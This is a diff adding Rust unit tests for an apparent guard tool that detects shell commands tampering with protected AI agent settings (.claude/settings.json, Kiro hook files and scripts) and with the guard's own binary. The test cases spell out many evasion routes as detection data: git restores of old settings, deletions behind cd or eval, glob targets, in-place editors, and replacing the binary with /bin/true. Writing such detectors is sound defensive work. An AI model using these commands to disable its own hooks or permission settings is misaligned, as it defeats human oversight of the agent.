+        let p = repo_protected();
+        for cmd in [
+            "git checkout HEAD~5 -- .claude/settings.json",
+            "git restore --source=HEAD~5 .claude/settings.json",
+            "git restore -s HEAD~5 .claude/settings.json",
+            "git checkout -- .claude/settings.json",
+            "git -C /repo rm .claude/settings.json",
+            "git mv .claude/settings.json x",
+            "git --no-pager checkout -- .claude/settings.json",
+        ] {
+            assert!(
+                bash_kinds(&p, cmd).contains(&ProtectedKind::ClaudeSettings),
+                "{cmd}"
+            );
+        }
+        assert!(bash_kinds(&p, "git checkout main").is_empty());
+        assert!(bash_kinds(&p, "git restore src/main.rs").is_empty());
+        // An option's value is not a pathspec.
+        assert!(
+            bash_kinds(&p, "git restore --pathspec-from-file .claude/settings.json").is_empty()
+        );
+    }
+
+    #[test]
+    fn classify_follows_cd_before_relative_writes() {
+        let p = repo_protected();
+        for cmd in [
+            "cd .claude && echo {} > settings.json",
+            "cd .claude; rm settings.json",
+            "pushd .claude; rm settings.json",
+            "cd /repo/.claude && tee settings.json",
+            "cd $X && rm settings.json",
+            "cd - && rm settings.json",
+            // Shell code run by a command is walked in order too.
+            "bash -c 'cd .claude && echo {} > settings.json'",
+            "su -c 'cd .claude; rm settings.json'",
+            "cd .claude && sh -c 'echo {} > settings.json'",
+            "eval 'cd .claude && echo {} >| settings.json'",
+        ] {
+            assert!(
+                bash_kinds(&p, cmd).contains(&ProtectedKind::ClaudeSettings),
+                "{cmd}"
+            );
+        }
+        assert!(bash_kinds(&p, "cd src && echo x > a.txt").is_empty());
+        assert!(bash_kinds(&p, "cd .claude && echo x > notes.txt").is_empty());
+    }
+
+    #[test]
+    fn classify_resolves_cwd_references_and_which_lookups() {
+        let p = ProtectedPaths {
+            binary: Some(PathBuf::from("/usr/local/bin/ptuf")),
+            ..repo_protected()
+        };
+        for cmd in [
+            "echo {} > $PWD/.claude/settings.json",
+            "echo {} > ${PWD}/.claude/settings.json",
+            "echo {} > \"$(pwd)/.claude/settings.json\"",
+            "echo x > $OUT/.claude/settings.json",
+        ] {
+            assert!(
+                bash_kinds(&p, cmd).contains(&ProtectedKind::ClaudeSettings),
+                "{cmd}"
+            );
+        }
+        for cmd in [
+            "rm $(which ptuf)",
+            "cp /bin/true $(command -v ptuf)",
+            "rm $(type -P ptuf)",
+        ] {
+            assert!(
+                bash_kinds(&p, cmd).contains(&ProtectedKind::Binary),
+                "{cmd}"
+            );
+        }
+        for cmd in [
+            "echo x > $OUT/config.yaml",
+            "rm $(which node)",
+            "cp a \"$PWD/out.txt\"",
+        ] {
+            assert!(bash_kinds(&p, cmd).is_empty(), "{cmd}");
+        }
+    }
+
+    #[test]
+    fn classify_matches_glob_write_targets() {
+        let p = repo_protected();
+        for cmd in [
+            "echo {} > .clau*/settings.json",
+            "echo {} > .claude/settings.js?n",
+            "echo {} > .claude/[s]ettings.json",
+            "rm .claude/*.json",
+            "rm -rf .c*",
+        ] {
+            assert!(
+                bash_kinds(&p, cmd).contains(&ProtectedKind::ClaudeSettings),
+                "{cmd}"
+            );
+        }
+        for cmd in [
+            "rm *.txt",
+            "rm -rf src/*",
+            "echo hi > out*.log",
+            "rm .claude/*.md",
+        ] {
+            assert!(bash_kinds(&p, cmd).is_empty(), "{cmd}");
+        }
+    }
+
+    #[test]
+    fn classify_matches_in_place_editors() {
+        let p = repo_protected();
+        for cmd in [
+            "jq . .claude/settings.json | sponge .claude/settings.json",
+            "patch .claude/settings.json < p",
+            "ed .claude/settings.json",
+            "awk -i inplace '{}' .claude/settings.json",
+            "gawk -iinplace '{}' .claude/settings.json",
+            "perl -pi -e 's/a/b/' .claude/settings.json",
+            "ruby -i -pe '1' .claude/settings.json",
+        ] {
+            assert!(
+                bash_kinds(&p, cmd).contains(&ProtectedKind::ClaudeSettings),
+                "{cmd}"
+            );
+        }
+        assert!(bash_kinds(&p, "awk '{print}' .claude/settings.json").is_empty());
+        assert!(bash_kinds(&p, "perl -ne 'print' .claude/settings.json").is_empty());
+    }
+
+    #[test]
+    fn fnmatch_follows_shell_rules() {
+        assert!(fnmatch(b"*.json", b"settings.json"));
+        assert!(fnmatch(b"se?tings.js[a-z]n", b"settings.json"));
+        assert!(fnmatch(b"[!x]*", b"settings"));
+        assert!(!fnmatch(b"*", b".claude"));
+        assert!(fnmatch(b".c*", b".claude"));
+        assert!(fnmatch(b"a[", b"a["));
+        assert!(!fnmatch(b"[^s]*", b"settings"));
+        // `]` first in a set is a member, not the terminator.
+        assert!(fnmatch(b"[]a]", b"]"));
+        assert!(fnmatch(b"[]a]", b"a"));
+        // The negation marker is not itself a member.
+        assert!(fnmatch(b"[!a]", b"!"));
+        assert!(!fnmatch(b"[!a]", b"a"));
+        // `?` needs a character.
+        assert!(!fnmatch(b"a?", b"a"));
+        // A range after the negation marker is still a range.
+        assert!(!fnmatch(b"[!a-c]", b"b"));
+        assert!(fnmatch(b"[!a-c]", b"d"));
+        assert!(fnmatch(b"[xa-c]", b"b"));
+        // A trailing `-` before `]` is a member, not a range.
+        assert!(!fnmatch(b"[!xa-]", b"-"));
+        assert!(fnmatch(b"[!xa-]", b"b"));
+        // An unterminated `[` (even one ending in `-`) is a literal.
+        assert!(fnmatch(b"[a-", b"[a-"));
+        assert!(!fnmatch(b"[ab", b"xab"));
+        // `*` backtracks to the latest star only, so a pathological
+        // pattern stays polynomial (the recursive form was exponential).
+        let pattern = "*a".repeat(40) + "b";
+        assert!(!fnmatch(pattern.as_bytes(), "a".repeat(400).as_bytes()));
+        assert!(fnmatch(b"*a*b*c", b"xxaxxbxxc"));
+        assert!(!fnmatch(b"*a*b*c", b"xxaxxcxxb"));
+        assert!(fnmatch(b"a**", b"a"));
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn path_glob_matches_compares_non_utf8_components_exactly() {
+        use std::os::unix::ffi::OsStrExt;
+        let path = |b: &[u8]| PathBuf::from(std::ffi::OsStr::from_bytes(b));
+        let pat = path(b"/a/\xff/*.json");
+        assert!(path_glob_matches(&pat, &path(b"/a/\xff/x.json"), false));
+        assert!(!path_glob_matches(&pat, &path(b"/a/\xfe/x.json"), false));
+    }
+
+    #[test]
+    fn path_glob_matches_respects_length_unless_prefix() {
+        let pat = Path::new("/a/*");
+        assert!(path_glob_matches(pat, Path::new("/a/b"), false));
+        assert!(!path_glob_matches(pat, Path::new("/a/b/c"), false));
+        assert!(path_glob_matches(pat, Path::new("/a/b/c"), true));
+        assert!(!path_glob_matches(pat, Path::new("/a"), true));
+    }
+
+    #[test]
+    fn literal_tail_skips_dot_and_empty_components() {
+        assert_eq!(
+            literal_tail("$D/./.claude//settings.json"),
+            Some(PathBuf::from(".claude/settings.json")),
+        );
+        assert_eq!(literal_tail("$D/config.yaml"), None);
+        assert_eq!(literal_tail(".claude/settings.json"), None);
+    }
+
+    #[test]
+    fn expand_cwd_references_leaves_longer_names() {
+        let cwd = Some(Path::new("/w"));
+        assert_eq!(expand_cwd_references("$PWD/a", cwd), "/w/a");
+        assert_eq!(expand_cwd_references("$PWD_X/a", cwd), "$PWD_X/a");
+        assert_eq!(expand_cwd_references("$PWDX/a", cwd), "$PWDX/a");
+        assert_eq!(expand_cwd_references("${PWD}/a", cwd), "/w/a");
+    }
+
+    #[test]
+    fn edits_in_place_needs_the_inplace_extension() {
+        let argv = |cmd: &str| crate::facts::shell::parse(cmd).segments[0].commands[0].clone();
+        assert!(edits_in_place(&argv("awk -i inplace '{print}' f")));
+        assert!(!edits_in_place(&argv("awk -i lib.awk '{print}' f")));
+        assert!(!edits_in_place(&argv("awk -f inplace f")));
+        assert!(edits_in_place(&argv("perl -pi -e 1 f")));
+        assert!(!edits_in_place(&argv("perl --include f")));
+    }
+
+    #[test]
+    fn heredoc_body_is_not_a_write_target() {
+        let p = repo_protected();
+        let cmd = "cat <<EOF\n$HOME/.claude/settings.json\n.claude/settings.json\nEOF\n";
+        assert!(bash_kinds(&p, cmd).is_empty(), "{cmd}");
+        let cmd = "cd sub && cat <<EOF\n../.claude/settings.json\nEOF\n";
+        assert!(bash_kinds(&p, cmd).is_empty(), "{cmd}");
     }
 
     #[test]
@@ -1060,15 +1899,76 @@ mod tests {
     }
 
     #[test]
-    fn collect_kiro_settings_is_empty_when_agents_dir_missing() {
+    fn collect_kiro_settings_is_only_managed_hook_file_when_dirs_missing() {
         let env = MapEnv::new(&[("HOME", "/h")]);
         let cfg = Config::default();
         let p = ProtectedPaths::collect_with_env(Some(Path::new("/repo")), &cfg, &env);
-        assert!(
-            p.kiro_settings.is_empty(),
-            "no .kiro/agents/ dir should yield empty kiro_settings, got {:?}",
-            p.kiro_settings
+        assert_eq!(
+            p.kiro_settings,
+            vec![
+                PathBuf::from("/h/.kiro/hooks/ptuf.json"),
+                PathBuf::from("/repo/.kiro/hooks/ptuf.json"),
+            ],
+            "no .kiro dirs should leave only the managed v3 hook file protected",
         );
+    }
+
+    #[test]
+    fn collect_enumerates_kiro_v3_hook_documents_and_their_scripts() {
+        let dir = std::env::temp_dir().join(format!(
+            "ptuf-self-paths-kiro-v3-{}-{}",
+            std::process::id(),
+            line!()
+        ));
+        let _ = std::fs::remove_dir_all(&dir);
+        let repo = dir.join("repo");
+        let home = dir.join("home");
+        std::fs::create_dir_all(repo.join(".kiro/hooks")).expect("mkdir repo hooks");
+        std::fs::create_dir_all(home.join(".kiro/agents")).expect("mkdir home agents");
+        std::fs::write(
+            repo.join(".kiro/hooks/guard.json"),
+            r#"{"version":"v1","hooks":[{"name":"g","trigger":"PreToolUse",
+                "action":{"type":"command","command":"./hooks/guard.sh hook kiro-v3"}}]}"#,
+        )
+        .expect("write hook doc");
+        std::fs::write(repo.join(".kiro/hooks/notes.txt"), "ignored").expect("write txt");
+        std::fs::write(
+            home.join(".kiro/agents/dev.json"),
+            r#"{"name":"dev","hooks":[{"name":"p","trigger":"PreToolUse",
+                "action":{"type":"command","command":"/opt/inline.sh"}}]}"#,
+        )
+        .expect("write inline profile");
+        let home_str = home.to_string_lossy().into_owned();
+        let env = MapEnv::new(&[("HOME", home_str.as_str())]);
+        let p = ProtectedPaths::collect_with_env(Some(&repo), &Config::default(), &env);
+        let canon = |p: PathBuf| p.canonicalize().unwrap_or(p);
+        assert!(
+            p.kiro_settings
+                .contains(&canon(repo.join(".kiro/hooks/guard.json")))
+        );
+        assert!(
+            p.kiro_settings
+                .contains(&repo.join(".kiro/hooks/ptuf.json"))
+        );
+        assert!(
+            p.kiro_settings
+                .contains(&canon(home.join(".kiro/agents/dev.json")))
+        );
+        assert!(
+            !p.kiro_settings
+                .contains(&canon(repo.join(".kiro/hooks/notes.txt")))
+        );
+        assert!(
+            p.hook_scripts.iter().any(|s| s.ends_with("hooks/guard.sh")),
+            "standalone hook script must be protected, got {:?}",
+            p.hook_scripts
+        );
+        assert!(
+            p.hook_scripts.contains(&PathBuf::from("/opt/inline.sh")),
+            "inline profile hook script must be protected, got {:?}",
+            p.hook_scripts
+        );
+        let _ = std::fs::remove_dir_all(&dir);
     }
 
     #[test]
